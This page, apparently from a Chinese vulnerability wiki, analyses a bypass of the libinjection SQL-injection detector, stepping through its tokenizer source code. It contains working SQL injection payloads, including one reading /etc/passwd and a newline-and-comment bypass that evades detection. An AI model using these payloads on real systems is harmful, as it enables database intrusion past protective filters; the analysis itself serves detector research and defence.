<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Libinjection/Libinjection%20%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Libinjection 语义分析通用绕过 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Libinjection \u8bed\u4e49\u5206\u6790\u901a\u7528\u7ed5\u8fc7", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Libssh/%EF%BC%88CVE-2018-10933%EF%BC%89Libssh%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Libssh/%EF%BC%88CVE-2018-10933%EF%BC%89Libssh%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2018-10933）Libssh 服务端权限认证绕过漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" class="btn btn-xs btn-link">
        LerxCMS 6.5 后台ssrf getshell
      </a>
    </div>
    
  </div>

    

    <h1 id="libinjection">Libinjection 语义分析通用绕过<a class="headerlink" href="#libinjection" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>源码下载地址 <code>https://github.com/client9/libinjection</code></p>
<blockquote>
<p>example.c</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;strings.h&gt;</span>
<span class="c1">#include &lt;errno.h&gt;</span>
<span class="c1">#include &quot;libinjection.h&quot;</span>
<span class="c1">#include &quot;libinjection_sqli.h&quot;</span>

<span class="nb nb-Type">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">struct</span><span class="w"> </span><span class="n">libinjection_sqli_state</span><span class="w"> </span><span class="n">state</span><span class="p">;</span>
<span class="w">    </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">issqli</span><span class="p">;</span>

<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="o">*</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">    </span><span class="n">size_t</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>

<span class="w">    </span><span class="o">/*</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">real</span><span class="o">-</span><span class="n">world</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">would</span><span class="w"> </span><span class="n">url</span><span class="o">-</span><span class="n">decode</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">etc</span><span class="w"> </span><span class="o">*/</span>

<span class="w">    </span><span class="n">libinjection_sqli_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">slen</span><span class="p">,</span><span class="w"> </span><span class="n">FLAG_NONE</span><span class="p">);</span>
<span class="w">    </span><span class="n">issqli</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">libinjection_is_sqli</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">issqli</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;sqli detected with fingerprint of &#39;</span><span class="si">%s</span><span class="s2">&#39;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">state</span><span class="o">.</span><span class="n">fingerprint</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">issqli</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">$</span><span class="w"> </span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">Wall</span><span class="w"> </span><span class="o">-</span><span class="n">Wextra</span><span class="w"> </span><span class="n">examples</span><span class="o">.</span><span class="n">c</span><span class="w"> </span><span class="n">libinjection_sqli</span><span class="o">.</span><span class="n">c</span>
<span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">a</span><span class="o">.</span><span class="n">out</span><span class="w"> </span><span class="s2">&quot;-1&#39; and 1=1 union/* foo */select load_file(&#39;/etc/passwd&#39;)--&quot;</span>
<span class="n">sqli</span><span class="w"> </span><span class="n">detected</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="s1">&#39;s&amp;1UE&#39;</span>
</code></pre></div>

<p><strong>首先给一个pyload</strong></p>
<div class="codehilite"><pre><span></span><code># ./bin &quot;ad1n&#39;-- %a%0aunion select 1,database(),user() -- &quot; 
not sqli 
#
</code></pre></div>

<p>测试payload 是否OK</p>
<p><img alt="1.png" src="../resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId24.png" /></p>
<p>为什么会这样呢???</p>
<p>首先打开源码吧</p>
<p>如果对这个语义分析不太了解的吧，可以去百度上可以找到很多分析的文章这里就不过多阐述了</p>
<p>下图是一个运行的一个流程图</p>
<p><img alt="2.png" src="../resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId25.png" /></p>
<h3 id="_4">它内部分为四种模式<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">无符号</span><span class="w"> </span><span class="n">标准SQL</span><span class="w"> </span><span class="n">模式</span><span class="w"> </span>
<span class="mf">2.</span><span class="w"> </span><span class="n">无符号</span><span class="w"> </span><span class="n">MySQL模式</span><span class="w"> </span>
<span class="mf">3.</span><span class="w"> </span><span class="n">单引号</span><span class="w"> </span><span class="n">标准SQL</span><span class="w"> </span><span class="n">模式</span><span class="w"> </span>
<span class="mf">4.</span><span class="w"> </span><span class="n">单引号</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">模式</span><span class="w"> </span>
<span class="mf">5.</span><span class="w"> </span><span class="n">双引号</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">模式</span>
</code></pre></div>

<p>然后上面是一个单引号的标准SQL 的匹配他的一个核心点在于如下 函数libinjection_sqli_tokenize
作为一个转换内部字符的一个入口</p>
<div class="codehilite"><pre><span></span><code><span class="nc">int</span><span class="w"> </span><span class="n">libinjection_sqli_tokenize</span><span class="p">(</span><span class="n">struct</span><span class="w"> </span><span class="n">libinjection_sqli_state</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">sf</span><span class="p">)</span>
<span class="err">{</span>
<span class="w">    </span><span class="n">pt2Function</span><span class="w"> </span><span class="n">fnptr</span><span class="p">;</span>
<span class="w">    </span><span class="n">size_t</span><span class="w"> </span><span class="o">*</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">;</span>
<span class="w">    </span><span class="n">stoken_t</span><span class="w"> </span><span class="o">*</span><span class="k">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="k">current</span><span class="p">;</span>
<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="nc">char</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">s</span><span class="p">;</span>
<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">slen</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">slen</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">FALSE</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">​</span>
<span class="w">    </span><span class="o">//</span><span class="n">初始化</span>
<span class="w">    </span><span class="n">st_clear</span><span class="p">(</span><span class="k">current</span><span class="p">);</span>
<span class="w">    </span><span class="n">sf</span><span class="o">-&gt;</span><span class="k">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">current</span><span class="p">;</span>
<span class="err">​</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">pos</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">FLAG_QUOTE_SINGLE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">FLAG_QUOTE_DOUBLE</span><span class="p">)))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="o">*</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parse_string_core</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">slen</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">current</span><span class="p">,</span><span class="w"> </span><span class="n">flag2delim</span><span class="p">(</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="ss">&quot;单引号双引号进入&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">stats_tokens</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">TRUE</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">​</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">pos</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">slen</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="err">​</span>
<span class="w">        </span><span class="cm">/*</span>
<span class="cm">         * get current character</span>
<span class="cm">         */</span>
<span class="w">        </span><span class="n">const</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="nc">char</span><span class="w"> </span><span class="n">ch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">unsigned</span><span class="w"> </span><span class="nc">char</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">s</span><span class="o">[</span><span class="n">*pos</span><span class="o">]</span><span class="p">);</span>
<span class="w">        </span><span class="cm">/*</span>
<span class="cm">         * look up the parser, and call it</span>
<span class="cm">         *</span>
<span class="cm">         * Porting Note: this is mapping of char to function</span>
<span class="cm">         *   charparsers[ch]()</span>
<span class="cm">         */</span>
<span class="w">        </span><span class="n">fnptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">char_parse_map</span><span class="o">[</span><span class="n">ch</span><span class="o">]</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fnptr</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">sf</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">current</span><span class="o">-&gt;</span><span class="n">type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">CHAR_NULL</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">stats_tokens</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">TRUE</span><span class="p">;</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">FALSE</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div>

<p>为什么<code># "ad1n'-- %a%0aunion select 1,database(),user() -- "</code>
这么一个简单的可以绕过呢。</p>
<p>首先他是吧 <code>admi'</code> 先进入无符号的标准SQL 然后发现有一个\' 后面就转到
单引号的标准SQL</p>
<p>单引号标准SQL 首先获取的<code>admn'</code> 然后break</p>
<p>继续到了下一层碰到了一个 - 那么走到parse_dash函数中</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="n">parse_dash</span><span class="p">(</span><span class="n">struct</span><span class="w"> </span><span class="n">libinjection_sqli_state</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">sf</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">cs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">s</span><span class="p">;</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">slen</span><span class="p">;</span>
<span class="w">    </span><span class="n">size_t</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">;</span>
<span class="err">​</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">cs</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;-&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">char_is_white</span><span class="p">(</span><span class="n">cs</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">])</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parse_eol_comment</span><span class="p">(</span><span class="n">sf</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">cs</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parse_eol_comment</span><span class="p">(</span><span class="n">sf</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">cs</span><span class="p">[</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;-&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">FLAG_SQL_ANSI</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">stats_comment_ddx</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parse_eol_comment</span><span class="p">(</span><span class="n">sf</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">st_assign_char</span><span class="p">(</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">current</span><span class="p">,</span><span class="w"> </span><span class="n">TYPE_OPERATOR</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;-&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>然后当前的pos 一定是符合第一个判断条件的。继续跟踪parse_eol_comment
函数</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="n">parse_eol_comment</span><span class="p">(</span><span class="n">struct</span><span class="w"> </span><span class="n">libinjection_sqli_state</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">sf</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">cs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">s</span><span class="p">;</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">slen</span><span class="p">;</span>
<span class="w">    </span><span class="n">size_t</span><span class="w"> </span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">pos</span><span class="p">;</span>

<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">endpos</span><span class="w"> </span><span class="o">=</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">memchr</span><span class="p">((</span><span class="k">const</span><span class="w"> </span><span class="nb nb-Type">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">cs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pos</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pos</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">endpos</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">st_assign</span><span class="p">(</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">current</span><span class="p">,</span><span class="w"> </span><span class="n">TYPE_COMMENT</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">slen</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">cs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pos</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">slen</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">st_assign</span><span class="p">(</span><span class="n">sf</span><span class="o">-&gt;</span><span class="n">current</span><span class="p">,</span><span class="w"> </span><span class="n">TYPE_COMMENT</span><span class="p">,</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">size_t</span><span class="p">)(</span><span class="n">endpos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">cs</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">cs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pos</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">size_t</span><span class="p">)((</span><span class="n">endpos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">cs</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>这里只是判断了是否是有\n 这个。然后就直接进入到st_assign
函数中。继续跟踪st_assign 函数</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">st_assign</span><span class="p">(</span><span class="n">stoken_t</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">st</span><span class="p">,</span><span class="w"> </span><span class="n">const</span><span class="w"> </span><span class="nc">char</span><span class="w"> </span><span class="n">stype</span><span class="p">,</span><span class="n">size_t</span><span class="w"> </span><span class="n">pos</span><span class="p">,</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="nf">len</span><span class="p">,</span><span class="w"> </span><span class="n">const</span><span class="w"> </span><span class="nc">char</span><span class="o">*</span><span class="w"> </span><span class="k">value</span><span class="p">)</span>
<span class="err">{</span>
<span class="w">    </span><span class="n">const</span><span class="w"> </span><span class="n">size_t</span><span class="w"> </span><span class="n">MSIZE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LIBINJECTION_SQLI_TOKEN_SIZE</span><span class="p">;</span>
<span class="w">    </span><span class="n">size_t</span><span class="w"> </span><span class="k">last</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">len</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MSIZE</span><span class="w"> </span><span class="vm">?</span><span class="w"> </span><span class="nf">len</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="p">(</span><span class="n">MSIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="n">st</span><span class="o">-&gt;</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nc">char</span><span class="p">)</span><span class="w"> </span><span class="n">stype</span><span class="p">;</span>
<span class="w">    </span><span class="n">st</span><span class="o">-&gt;</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pos</span><span class="p">;</span>
<span class="w">    </span><span class="n">st</span><span class="o">-&gt;</span><span class="nf">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">last</span><span class="p">;</span>
<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">st</span><span class="o">-&gt;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">value</span><span class="p">,</span><span class="w"> </span><span class="k">last</span><span class="p">);</span>
<span class="w">    </span><span class="n">st</span><span class="o">-&gt;</span><span class="n">val</span><span class="o">[</span><span class="n">last</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CHAR_NULL</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div>

<p>当前函数也是只是赋值了一下val然后就可以做任何操作。</p>
<p>最后就是 <code>admin'</code> 转换成了S</p>
<p>-- 因为没有查询到直接是C</p>
<p>最后得到的匹配规则为SC 。此匹配规则不在数据库中。完成了绕过。</p>
<p>附一张调试打印图</p>
<p><img alt="3.png" src="../resource/Libinjection%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87/media/rId27.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Libssh/%EF%BC%88CVE-2018-10933%EF%BC%89Libssh%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Libssh/%EF%BC%88CVE-2018-10933%EF%BC%89Libssh%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2018-10933）Libssh 服务端权限认证绕过漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" class="btn btn-xs btn-default pull-left">
